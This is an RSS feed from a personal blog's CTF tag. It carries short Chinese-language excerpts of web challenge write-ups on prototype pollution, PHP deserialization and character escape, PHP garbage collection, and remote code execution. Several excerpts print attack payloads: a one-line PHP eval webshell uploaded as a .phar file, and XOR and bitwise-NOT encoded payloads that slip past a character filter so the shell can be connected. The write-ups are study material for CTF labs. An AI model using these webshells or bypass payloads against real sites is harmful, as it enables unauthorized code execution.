<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>ctf on main1o</title>
    <link>https://main1o.github.io/tags/ctf/</link>
    <description>Recent content in ctf on main1o</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 29 Aug 2023 23:10:53 +0800</lastBuildDate><atom:link href="https://main1o.github.io/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Redpwnctf_2019_challenges_web</title>
      <link>https://main1o.github.io/post/redpwnctf_2019_challenges_web/</link>
      <pubDate>Tue, 29 Aug 2023 23:10:53 +0800</pubDate>
      
      <guid>https://main1o.github.io/post/redpwnctf_2019_challenges_web/</guid>
      <description>redpwnctf-2019-challenges-web 题目环境
这题目是nodejs原型链污染 下面是主要代码
const crypto = require(&amp;#39;crypto&amp;#39;) const http = require(&amp;#39;http&amp;#39;) const mustache = require(&amp;#39;mustache&amp;#39;) const getRawBody = require(&amp;#39;raw-body&amp;#39;) const _ = require(&amp;#39;lodash&amp;#39;) const flag = require(&amp;#39;./flag&amp;#39;) const indexTemplate = ` &amp;lt;!doctype html&amp;gt; &amp;lt;style&amp;gt; body { background: #172159; } * { color: #fff; } &amp;lt;/style&amp;gt; &amp;lt;h1&amp;gt;your public blueprints!&amp;lt;/h1&amp;gt; &amp;lt;i&amp;gt;(in compliance with military-grade security, we only show the public ones. you must have the unique URL to access private blueprints.)&amp;lt;/i&amp;gt; &amp;lt;br&amp;gt; {{#blueprints}} {{#public}} &amp;lt;div&amp;gt;&amp;lt;br&amp;gt;&amp;lt;a href=&amp;#34;/blueprints/{{id}}&amp;#34;&amp;gt;blueprint&amp;lt;/a&amp;gt;: {{content}}&amp;lt;br&amp;gt;&amp;lt;/div&amp;gt; {{/public}} {{/blueprints}} &amp;lt;br&amp;gt;&amp;lt;a href=&amp;#34;/make&amp;#34;&amp;gt;make your own blueprint!</description>
    </item>
    
    <item>
      <title>PHP_GC垃圾回收机制</title>
      <link>https://main1o.github.io/post/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</link>
      <pubDate>Fri, 09 Sep 2022 00:00:00 +0000</pubDate>
      
      <guid>https://main1o.github.io/post/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</guid>
      <description>PHP底层 GC 垃圾回收机制 PHP: 引用计数基本知识 - Manual
建议一定先看完 PHP官方手册的说明
简单理解为一个对象没有被引用的时候 就会被GC机制回收 在被回收的同时 会触发__destruct()方法 这是一个关键点~
refcount变量引用计数 is_ref是否被引用 bool值
调试工具Xdebug - Debugger and Profiler Tool for PHP 如果是小皮面板的话直接 php扩展开启就行了
PHP不同版本下GC机制有变化 以下环境为PHP 5.4.45模拟
PHP 深浅拷贝 在 PHP 中引用意味着用不同的名字访问同一个变量内容。这并不像 C 的指针：例如你不能对他们做指针运算，他们并不是实际的内存地址。替代的是，引用是符号表别名。注意在PHP 中，变量名和变量内容是不一样的，因此同样的内容可以有不同的名字。最接近的比喻是 Unix 的文件名和文件本身——变量名是目录条目，而变量内容则是文件本身。引用可以被看作是 Unix 文件系统中的硬链接
引用取消 则需要使用unset()只是断开了变量名和变量内容之间的绑定,并不是说变量内容被销毁了
深拷贝： 赋值时值完全复制对其中一个作出改变，不会影响另一个
在PHP5以上，对象的 = 赋值和传递都是引用(浅)。php提供了clone函数实现拷贝副本
直接把$a赋值给$b之后，$b修改并不会对$a任何影响，可以看到2次输出都是main1o
变量$a引用计数值refcount也为1，并且is_ref也是false
对象的深拷贝 用clone函数拷贝出一个完全一样的对象，修改该对象，并不会影响原始对象
修改$a对象，只会对$b对象有影响，并不会对$c对象有任何影响
浅拷贝： 赋值时，引用赋值，相当于取了一个别名。对其中一个修改，会影响另一个
使用&amp;amp;来使用自定义引用变量，我们对$a进行修改 直接影响了$b “main1o” &amp;ndash;&amp;gt; &amp;ldquo;ikun&amp;rdquo;
就是$a 和$b都指向内存中的同一块地址
反序列化中的作用 补充：
方法名 作用 __construct 构造函数，在创建对象时候初始化对象，一般用于对变量赋初值 __destruct 析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用 即对象被销毁触发！手动销毁为unset(Object) 手动销毁对象unset()触发了$a对象中的析构函数。提前输出了 1__destruct()</description>
    </item>
    
    <item>
      <title>反序列化字符逃逸</title>
      <link>https://main1o.github.io/post/php%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</link>
      <pubDate>Wed, 24 Aug 2022 00:00:00 +0000</pubDate>
      
      <guid>https://main1o.github.io/post/php%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</guid>
      <description>Php反序列化字符逃逸 个人理解的字符逃逸
字符增加 demo_1: &amp;lt;?php error_reporting(0); highlight_file(__FILE__); class ik{ public $username = &amp;#39;m&amp;#39;; public $password = &amp;#39;ikun&amp;#39;; public function __construct($username){ $this-&amp;gt;username = $username; } public function __wakeup(){ if($this-&amp;gt;password === &amp;#39;ik&amp;#39;){ include(&amp;#39;flag.php&amp;#39;); echo PHP_EOL . $flag; # flag.php -&amp;gt; flag{this_flag} }else{ echo &amp;#34;哎呦 你干嘛~&amp;#34;; } } } function filter($obj){ return str_replace(&amp;#39;l&amp;#39;,&amp;#39;ll&amp;#39;,$obj); } $username = $_GET[&amp;#39;a&amp;#39;]; $obj = serialize(new ik($username)); $ter = filter($obj); unserialize($ter); __wakeup()魔术方法会在反序列化时，判断属性password是否是ik然后在引入flag。但是类中唯一的传值点就在**$username**
filter()方法对类ik的对象进行替换会多出一个字符，反序列化是从左往右读的,只读键的长度,多出了字符就忽略，那么这个就叫字符逃逸。可以对**$username进行逃逸，从而覆盖到$password**
O:4:&amp;#34;demo&amp;#34;:1:{s:4:&amp;#34;name&amp;#34;;s:2:&amp;#34;iki&amp;#34;;} # 2:&amp;#34;iki&amp;#34; 这里键的长度为3，只读键的长度多了一个i。从左往右读，那么这个&amp;#39;}&amp;#39;就是逃逸(忽略)了的 比如:
&amp;lt;?php class ik{ public $username = &amp;#39;m&amp;#39;; public $password = &amp;#39;ik&amp;#39;; } print_r(serialize(new ik())); # O:2:&amp;#34;ik&amp;#34;:2:{s:8:&amp;#34;username&amp;#34;;s:1:&amp;#34;m&amp;#34;;s:8:&amp;#34;password&amp;#34;;s:2:&amp;#34;ik&amp;#34;;} 这&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:2:&amp;quot;ik&amp;quot;;}就是要逃逸的字符数量27。php通过;}来判断反序列化的结束标志。因为之前的filter()将1个l替换为2个l，多了一个l。所以要逃逸我们的payload需要27个l然后拼接</description>
    </item>
    
    <item>
      <title>2022强网先锋  rcefile</title>
      <link>https://main1o.github.io/post/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/</link>
      <pubDate>Wed, 17 Aug 2022 00:00:00 +0000</pubDate>
      
      <guid>https://main1o.github.io/post/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/</guid>
      <description>2022强网先锋 rcefile 环境下载地址
代码审计
spl_autoload_register 说明
spl_autoload_register()在没有限制的情况，new有一个当前不存在的类test，spl_autoload_register会自动去当前目录下包含文件名为test.php 或者是test.inc
unserialize反序列化本地cookie[&amp;lsquo;userfile&amp;rsquo;]
upload.php
在39行黑名单中并没有对 phar 后缀进行过滤
上传文件 1.jpg 内容
&amp;lt;?php phpinfo(); eval($_POST[&amp;#39;a&amp;#39;]); 修改后缀 为 1.phar 并 查看图片获取重命名之后的图片名称
使用这个名称去构建一个序列化对象 ，config.inc.php去cookie里找，并进行反序列化。触发**spl_autoload_register()**去包含
afd4b9668ced586e2528dc1863a650fd.inc
&amp;lt;?php class afd4b9668ced586e2528dc1863a650fd{ # 不能数字开头 function __construst(){ } } $s = new afd4b9668ced586e2528dc1863a650fd(); echo serialize($s); # O:32:&amp;#34;afd4b9668ced586e2528dc1863a650fd&amp;#34;:0:{} </description>
    </item>
    
    <item>
      <title>SWPUCTF_2018_SimplePHP</title>
      <link>https://main1o.github.io/post/swpuctf-2018-simplephp/</link>
      <pubDate>Thu, 04 Aug 2022 00:00:00 +0000</pubDate>
      
      <guid>https://main1o.github.io/post/swpuctf-2018-simplephp/</guid>
      <description>[SWPUCTF 2018]SimplePHP 任意文件包含？
大概有这几个文件。可以读取file.php，function.php，class.php，base.php文件的源码
file.php
&amp;lt;?php header(&amp;#34;content-type:text/html;charset=utf-8&amp;#34;); include &amp;#39;function.php&amp;#39;; include &amp;#39;class.php&amp;#39;; ini_set(&amp;#39;open_basedir&amp;#39;,&amp;#39;/var/www/html/&amp;#39;); $file = $_GET[&amp;#34;file&amp;#34;] ? $_GET[&amp;#39;file&amp;#39;] : &amp;#34;&amp;#34;; if(empty($file)) { echo &amp;#34;&amp;lt;h2&amp;gt;There is no file to show!&amp;lt;h2/&amp;gt;&amp;#34;; } $show = new Show(); if(file_exists($file)) { $show-&amp;gt;source = $file; $show-&amp;gt;_show(); // 这里传的 $file 到 class.php文件中去形成文件读取了 } else if (!empty($file)){ die(&amp;#39;file doesn\&amp;#39;t exists.&amp;#39;); } ?&amp;gt; function.php
文件 &amp;lt;?php //show_source(__FILE__); include &amp;#34;base.php&amp;#34;; header(&amp;#34;Content-type: text/html;charset=utf-8&amp;#34;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[&amp;#34;file&amp;#34;][&amp;#34;name&amp;#34;].$_SERVER[&amp;#34;REMOTE_ADDR&amp;#34;]).&amp;#34;.jpg&amp;#34;; //mkdir(&amp;#34;upload&amp;#34;,0777); if(file_exists(&amp;#34;upload/&amp;#34; .</description>
    </item>
    
    <item>
      <title>2019极客大挑战</title>
      <link>https://main1o.github.io/post/2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</link>
      <pubDate>Thu, 09 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://main1o.github.io/post/2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</guid>
      <description>[极客大挑战 2019]RCE ME 在线环境BUUCTF搜索
&amp;lt;?php error_reporting(0); if(isset($_GET[&amp;#39;code&amp;#39;])){ $code=$_GET[&amp;#39;code&amp;#39;]; if(strlen($code)&amp;gt;40){ die(&amp;#34;This is too Long.&amp;#34;); } if(preg_match(&amp;#34;/[A-Za-z0-9]+/&amp;#34;,$code)){ die(&amp;#34;NO.&amp;#34;); } @eval($code); } else{ highlight_file(__FILE__); } // ?&amp;gt; 分析代码知道传入的值不能是A-Z,a-z,0-9并且不能大于40个字符
?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;amp;%ff=phpinfo // 这里进行异或绕过了 // 被解析为：${_GET}{%ff}();&amp;amp;%ff=phpinfo	再次构建payload
&amp;lt;?php error_reporting(0); $a=&amp;#39;assert&amp;#39;; $b=urlencode(~$a); echo $b; echo &amp;#34;&amp;lt;br&amp;gt;&amp;#34;; $c=&amp;#39;(eval($_POST[a]))&amp;#39;; $d=urlencode(~$c); echo $d; %9E%8C%8C%9A%8D%8B %D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6 // 传值得取反 code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6); 用web工具连接，蚁剑 在之前的phpinfo能看到很多函数被禁用了，蚁剑不能调用终端，所以得开代理下载一个蚁剑插件，在插件市场里，下载disable_functions的插件 然后在webshell连接页面，启用插件，选择模式 PHP7的UAF
在根目录看见readflag，运行的得到flag～</description>
    </item>
    
  </channel>
</rss>
